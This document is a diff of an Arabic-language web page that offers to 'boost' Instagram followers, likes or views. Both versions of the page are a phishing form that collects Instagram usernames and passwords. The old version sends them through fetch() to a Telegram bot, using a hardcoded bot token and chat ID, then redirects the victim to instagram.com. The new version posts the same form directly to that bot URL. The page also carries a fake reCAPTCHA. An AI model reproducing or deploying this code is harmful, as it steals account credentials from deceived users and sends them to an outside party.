@@ -5,26 +5,21 @@
   <title>رشق متابعين انستا</title>
   <style>
     body {
-      font-family: 'Tajawal', sans-serif;
-      background: linear-gradient(to right, #8e0038, #3e005f);
-      margin: 0;
-      padding: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      background: linear-gradient(to bottom right, #4e002d, #1a0033);
+      font-family: 'Arial', sans-serif;
       color: white;
+      text-align: center;
+      padding: 20px;
     }
     .container {
-      background-color: rgba(0, 0, 0, 0.4);
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-      width: 90%;
       max-width: 400px;
+      margin: 0 auto;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 20px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
     }
     h2 {
-      text-align: center;
       margin-bottom: 20px;
     }
     input, select, button {
@@ -32,107 +27,42 @@
       padding: 12px;
       margin: 10px 0;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       font-size: 16px;
     }
-    input[type="password"] {
-      font-family: sans-serif;
-      letter-spacing: 2px;
-    }
-    .show-pass {
-      margin-top: -5px;
-      font-size: 13px;
-      cursor: pointer;
-      text-align: left;
-      color: #ccc;
+    input, select {
+      background: white;
+      color: #1a0033;
     }
     button {
-      background-color: #0066cc;
+      background-color: #0052cc;
       color: white;
       cursor: pointer;
+      transition: background-color 0.3s;
     }
-    .loading {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-    }
-    .success-message {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-      color: #0f0;
+    button:hover {
+      background-color: #003d99;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>رشق متابعين انستا</h2>
-    <form id="boostForm">
-      <label>اسم المستخدم</label>
-      <input type="text" id="username" placeholder="مثال: insta_user123" required><label>كلمة المرور</label>
-  <input type="password" id="password" placeholder="كلمة مرور الحساب" required>
-  <div class="show-pass" onclick="togglePassword()">👁️ إظهار / إخفاء كلمة المرور</div>
-
-  <label>عدد المتابعين</label>
-  <select id="count">
-    <option>1000 متابع</option>
-    <option>2000 متابع</option>
-    <option>5000 متابع</option>
-  </select>
-
-  <label>نوع الرشق</label>
-  <select id="type">
-    <option>متابعين</option>
-    <option>لايكات</option>
-    <option>مشاهدات</option>
-  </select>
-
-  <div class="g-recaptcha" data-sitekey="fake-site-key"></div>
-
-  <button type="submit">ابدأ الرشق الآن</button>
-  <div class="loading">⏳ جاري الإرسال...</div>
-  <div class="success-message">✅ تم إرسال البيانات بنجاح</div>
-</form>
-
-  </div>  <script>
-    const form = document.getElementById("boostForm");
-    const loading = document.querySelector(".loading");
-    const success = document.querySelector(".success-message");
-
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
-      loading.style.display = "block";
-
-      // إرسال البيانات إلى تليجرام
-      const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
-      const chatId = "7197079453";
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const count = document.getElementById("count").value;
-      const type = document.getElementById("type").value;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: `🔥 طلب جديد من موقع الانستا\n👤 يوزر: ${username}\n🔑 باسورد: ${password}\n📦 عدد: ${count}\n📂 نوع: ${type}`,
-        }),
-      })
-      .then(() => {
-        loading.style.display = "none";
-        success.style.display = "block";
-        setTimeout(() => {
-          window.location.href = "https://instagram.com"; // تحويل بعد النجاح
-        }, 3000);
-      });
-    });
-
-    function togglePassword() {
-      const passInput = document.getElementById("password");
-      passInput.type = passInput.type === "password" ? "text" : "password";
-    }
-  </script></body>
+    <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post">
+      <input type="text" name="username" placeholder="اسم المستخدم" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
+      <select name="amount">
+        <option value="1000">1000</option>
+        <option value="2000">2000</option>
+        <option value="5000">5000</option>
+      </select>
+      <select name="type">
+        <option value="متابعين">متابعين</option>
+        <option value="لايكات">لايكات</option>
+        <option value="مشاهدات">مشاهدات</option>
+      </select>
+      <button type="submit">ابدأ الرشق الآن</button>
+    </form>
+  </div>
+</body>
 </html>
